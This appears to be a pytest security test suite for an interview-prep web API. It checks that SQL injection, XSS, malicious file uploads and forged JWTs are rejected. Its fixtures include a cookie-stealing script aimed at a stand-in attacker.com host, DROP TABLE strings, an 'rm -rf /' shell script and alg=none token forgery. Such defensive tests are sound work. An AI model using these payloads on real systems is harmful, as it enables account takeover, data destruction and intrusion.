import base64
import io
import json
import uuid
from datetime import datetime, timedelta, timezone
import pytest
from jose import jwt

from backend.app.core.config import settings
from backend.app.core.security import (
    create_access_token,
    decode_access_token,
    sanitize_input,
    sanitize_html,
)
from backend.app.models.models import User, Profile, InterviewSession


# ============================================================================
# 1. SQL INJECTION PREVENTION TESTS
# ============================================================================

def test_sql_injection_login_bypass_prevention(client, registered_user):
    """Verify classic SQL injection login bypass attempts fail with 401/422 and cannot bypass auth."""
    sqli_payloads = [
        "' OR '1'='1",
        "admin' --",
        "' OR 1=1 --",
        "admin'/*",
        "' or 1=1#",
        f"{registered_user['email']}' OR '1'='1",
        f"{registered_user['email']}'--",
    ]

    for payload in sqli_payloads:
        res = client.post("/api/auth/login", json={
            "email": payload if "@" in payload else "attacker@example.com",
            "password": payload
        })
        # Must be rejected, never 200 OK
        assert res.status_code in (400, 401, 422), f"SQLi payload breached login: {payload}"


def test_sql_injection_registration_prevention(client, db_session):
    """Verify SQL injection in registration does not execute or drop tables."""
    destructive_payload = "victim'; DROP TABLE users; --"
    email = f"sqli_{uuid.uuid4().hex[:6]}@example.com"

    res = client.post("/api/auth/register", json={
        "email": email,
        "password": "SafePassword123!",
        "full_name": destructive_payload
    })
    # If accepted or sanitized, verify the users table was NOT dropped
    assert res.status_code in (201, 400, 422)

    # Check that database is intact and users table still exists
    user_count = db_session.query(User).count()
    assert user_count >= 1


def test_sql_injection_profile_update_prevention(client, registered_user, db_session):
    """Verify SQL injection in profile update fields is treated as literal parameter."""
    sqli_role = "Architect'; DROP TABLE profile; SELECT * FROM users WHERE 'a'='a"
    sqli_skill = "Python'; UPDATE users SET is_active=0; --"

    res = client.put("/api/profile", headers=registered_user["headers"], json={
        "target_role": sqli_role,
        "skills": [sqli_skill, "Docker"]
    })
    assert res.status_code == 200

    # Ensure profile table still exists and data was parameterized safely
    prof = db_session.query(Profile).filter(Profile.user_id == registered_user["user_id"]).first()
    assert prof is not None
    assert "DROP TABLE" not in prof.target_role or "Architect" in prof.target_role


def test_sql_injection_interview_path_and_query_parameters(client, registered_user):
    """Verify SQL injection payloads in path/query parameters return 404 or clean error."""
    sqli_id = "' OR '1'='1' --"

    # GET /api/interviews/{id}
    res_get = client.get(f"/api/interviews/{sqli_id}", headers=registered_user["headers"])
    assert res_get.status_code == 404

    # POST /api/interviews/{id}/start
    res_start = client.post(f"/api/interviews/{sqli_id}/start", headers=registered_user["headers"])
    assert res_start.status_code == 404

    # GET /api/aptitude/test?category=...
    res_apt = client.get(f"/api/aptitude/test?category={sqli_id}")
    assert res_apt.status_code == 200
    assert isinstance(res_apt.json(), list)


# ============================================================================
# 2. XSS (CROSS-SITE SCRIPTING) SANITIZATION TESTS
# ============================================================================

def test_xss_sanitization_unit_vectors():
    """Verify sanitize_input strips/escapes standard and advanced OWASP XSS vectors."""
    vectors = [
        ("<script>alert('XSS')</script>", "alert"),
        ("<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>", ""),
        ("<img src=x onerror=alert(document.cookie)>", "onerror="),
        ("<svg onload=alert(1)>", "onload="),
        ("<iframe src=\"javascript:alert(1)\"></iframe>", "javascript:"),
        ("javascript:alert('pwned')", "javascript:"),
        ("<body onload=alert('test')>", "onload="),
        ("<a href=\"javascript:void(0)\">Click</a>", "javascript:"),
    ]

    for raw, forbidden_substr in vectors:
        cleaned = sanitize_input(raw)
        assert cleaned is not None
        # Must not contain active script tags or unescaped handlers
        assert "<script" not in cleaned.lower()
        assert "<iframe" not in cleaned.lower()
        if forbidden_substr:
            assert forbidden_substr not in cleaned


def test_xss_sanitization_in_profile_update(client, registered_user):
    """Verify XSS payloads in profile updates are sanitized and rendered safe."""
    xss_payload = "<script>alert('xss_attack')</script>Senior Developer"
    xss_skill = "<img src=x onerror=alert('cookie_theft')>React"

    res = client.put("/api/profile", headers=registered_user["headers"], json={
        "target_role": xss_payload,
        "skills": [xss_skill, "FastAPI"]
    })
    assert res.status_code == 200
    data = res.json()

    # Verify script tag was stripped / escaped
    assert "<script>" not in data["target_role"]
    assert "onerror=" not in data["skills"][0]

    # Verify retrieval also returns safe sanitized string
    get_res = client.get("/api/profile", headers=registered_user["headers"])
    assert get_res.status_code == 200
    get_data = get_res.json()
    assert "<script>" not in get_data["target_role"]
    assert "onerror=" not in get_data["skills"][0]


def test_xss_sanitization_in_user_registration(client):
    """Verify XSS in registration full_name is sanitized."""
    xss_name = "<script>alert(1)</script>Safe Candidate"
    email = f"xss_user_{uuid.uuid4().hex[:6]}@example.com"

    res = client.post("/api/auth/register", json={
        "email": email,
        "password": "Password123!",
        "full_name": xss_name
    })
    assert res.status_code == 201
    user_data = res.json()["user"]
    assert "<script>" not in user_data["full_name"]


def test_xss_sanitization_in_interview_answer(client, registered_user):
    """Verify XSS payload in answer submission is safely sanitized."""
    # 1. Create interview session
    create_res = client.post("/api/interviews", headers=registered_user["headers"], json={
        "interview_type": "hr",
        "domain": "Behavioral",
        "target_role": "Manager",
        "difficulty": "medium",
        "total_questions": 1,
        "enable_voice": False
    })
    assert create_res.status_code == 201
    int_id = create_res.json()["id"]

    # 2. Start session to get question
    start_res = client.post(f"/api/interviews/{int_id}/start", headers=registered_user["headers"])
    assert start_res.status_code == 200
    q_id = start_res.json()["current_question"]["id"]

    # 3. Submit answer containing script tag
    xss_answer = "<script>document.location='http://attacker.com/steal?c='+document.cookie</script> In my past experience, I resolved team conflict with open communication."
    sub_res = client.post(f"/api/interviews/{int_id}/submit-answer", headers=registered_user["headers"], json={
        "question_id": q_id,
        "answer_text": xss_answer,
        "duration_seconds": 25
    })
    assert sub_res.status_code == 200
    assert "answer_id" in sub_res.json()


# ============================================================================
# 3. FILE UPLOAD VALIDATION TESTS (Non-PDF or >10MB rejection)
# ============================================================================

def test_file_upload_rejects_non_pdf_extensions(client, registered_user):
    """Verify resume upload rejects non-PDF extensions with HTTP 400 Bad Request."""
    invalid_files = [
        ("malicious.exe", b"MZ\x90\x00\x03\x00\x00\x00", "application/x-msdownload"),
        ("exploit.sh", b"#!/bin/bash\nrm -rf /", "application/x-sh"),
        ("resume.txt", b"Plain text resume data", "text/plain"),
        ("resume.docx", b"PK\x03\x04 fake docx zip", "application/vnd.openxmlformats-officedocument.wordprocessingml.document"),
        ("photo.png", b"\x89PNG\r\n\x1a\n", "image/png"),
        ("script.py", b"import os; os.system('whoami')", "text/x-python"),
        ("resume.pdf.exe", b"MZ sneaky double extension", "application/octet-stream"),
        ("no_extension", b"Raw file bytes", "application/octet-stream"),
    ]

    for filename, content, mime in invalid_files:
        files = {"file": (filename, io.BytesIO(content), mime)}
        res = client.post("/api/profile/resume/upload", headers=registered_user["headers"], files=files)
        assert res.status_code == 400, f"Expected 400 for {filename}, got {res.status_code}"
        assert "Only PDF resume documents are supported" in res.json().get("detail", "")


def test_file_upload_rejects_files_larger_than_10mb(client, registered_user):
    """Verify resume upload rejects files larger than 10MB limit with HTTP 400 Bad Request."""
    # 10MB = 10 * 1024 * 1024 bytes = 10,485,760 bytes.
    # We construct a simulated file of 10.5 MB (11,010,048 bytes).
    oversized_bytes = b"%PDF-1.4 " + b"0" * (10 * 1024 * 1024 + 500 * 1024)

    files = {"file": ("oversized_resume.pdf", io.BytesIO(oversized_bytes), "application/pdf")}
    res = client.post("/api/profile/resume/upload", headers=registered_user["headers"], files=files)

    assert res.status_code == 400
    detail = res.json().get("detail", "")
    assert "exceeds maximum allowed limit of 10MB" in detail


def test_file_upload_accepts_valid_pdf_under_10mb(client, registered_user):
    """Verify resume upload accepts valid PDF files under the 10MB threshold."""
    # Minimal valid PDF structure
    minimal_pdf = (
        b"%PDF-1.4\n"
        b"1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n"
        b"2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n"
        b"3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >> endobj\n"
        b"4 0 obj << /Length 55 >> stream\n"
        b"BT /F1 12 Tf 72 712 Td (Alex Doe - Python & FastAPI Engineer) Tj ET\n"
        b"endstream\nendobj\n"
        b"xref\n0 5\n0000000000 65535 f \n0000000009 00000 n \n0000000058 00000 n \n0000000115 00000 n \n0000000216 00000 n \n"
        b"trailer << /Size 5 /Root 1 0 R >>\nstartxref\n320\n%%EOF"
    )

    files = {"file": ("valid_candidate_resume.pdf", io.BytesIO(minimal_pdf), "application/pdf")}
    res = client.post("/api/profile/resume/upload", headers=registered_user["headers"], files=files)

    assert res.status_code == 200
    data = res.json()
    assert data["filename"] == "valid_candidate_resume.pdf"
    assert "extracted_skills" in data
    assert "experience_level" in data


def test_file_upload_unauthenticated_rejected(client):
    """Verify file upload without JWT token returns 401 Unauthorized."""
    files = {"file": ("test.pdf", io.BytesIO(b"%PDF-1.4"), "application/pdf")}
    res = client.post("/api/profile/resume/upload", files=files)
    assert res.status_code == 401


# ============================================================================
# 4. JWT TAMPERING AND SIGNATURE VERIFICATION TESTS
# ============================================================================

def test_jwt_tampered_signature_rejected(client, registered_user):
    """Verify JWT with tampered/modified signature fails verification with 401."""
    original_token = registered_user["token"]
    parts = original_token.split(".")
    assert len(parts) == 3

    # Tamper with the signature portion
    tampered_sig = parts[2][:-4] + "ABCD"
    tampered_token = f"{parts[0]}.{parts[1]}.{tampered_sig}"

    res = client.get("/api/auth/me", headers={"Authorization": f"Bearer {tampered_token}"})
    assert res.status_code == 401
    assert "Invalid or expired" in res.json().get("detail", "")


def test_jwt_tampered_payload_rejected(client, registered_user):
    """Verify JWT with altered payload (privilege escalation) is rejected."""
    original_token = registered_user["token"]
    parts = original_token.split(".")

    # Decode and tamper payload
    payload_json = base64.urlsafe_b64decode(parts[1] + "==").decode("utf-8")
    payload = json.loads(payload_json)
    payload["sub"] = str(uuid.uuid4())  # Swap to another user
    tampered_payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")

    # Keep original signature (mismatched)
    tampered_token = f"{parts[0]}.{tampered_payload_b64}.{parts[2]}"

    res = client.get("/api/auth/me", headers={"Authorization": f"Bearer {tampered_token}"})
    assert res.status_code == 401


def test_jwt_expired_token_rejected(client, registered_user):
    """Verify that an expired JWT token returns 401 Unauthorized."""
    expired_token = create_access_token(
        data={"sub": registered_user["user_id"], "email": registered_user["email"]},
        expires_delta=timedelta(seconds=-3600)  # expired 1 hour ago
    )

    res = client.get("/api/auth/me", headers={"Authorization": f"Bearer {expired_token}"})
    assert res.status_code == 401
    assert "Invalid or expired" in res.json().get("detail", "")


def test_jwt_wrong_secret_signature_rejected(client, registered_user):
    """Verify that a token signed with an unauthorized secret key is rejected."""
    unauthorized_token = jwt.encode(
        {"sub": registered_user["user_id"], "email": registered_user["email"], "exp": datetime.now(timezone.utc) + timedelta(hours=1)},
        "completely-wrong-unauthorized-secret-key-999",
        algorithm="HS256"
    )

    res = client.get("/api/auth/me", headers={"Authorization": f"Bearer {unauthorized_token}"})
    assert res.status_code == 401
    assert "Invalid or expired" in res.json().get("detail", "")


def test_jwt_none_algorithm_attack_rejected(client, registered_user):
    """Verify that alg=none vulnerability attack is safely rejected."""
    header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip("=")
    payload = base64.urlsafe_b64encode(
        json.dumps({"sub": registered_user["user_id"], "email": registered_user["email"]}).encode()
    ).decode().rstrip("=")
    none_alg_token = f"{header}.{payload}."

    res = client.get("/api/auth/me", headers={"Authorization": f"Bearer {none_alg_token}"})
    assert res.status_code == 401


def test_jwt_malformed_tokens_rejected(client):
    """Verify malformed, blank, or non-JWT tokens return 401."""
    malformed_headers = [
        "Bearer ",
        "Bearer not.a.valid.jwt",
        "Bearer abcdef123456",
        "Bearer header.payload",  # missing signature part
        "Basic dXNlcjpwYXNzd29yZA==",  # wrong auth scheme
        "Token some_random_token",
    ]

    for header_val in malformed_headers:
        res = client.get("/api/auth/me", headers={"Authorization": header_val})
        assert res.status_code == 401
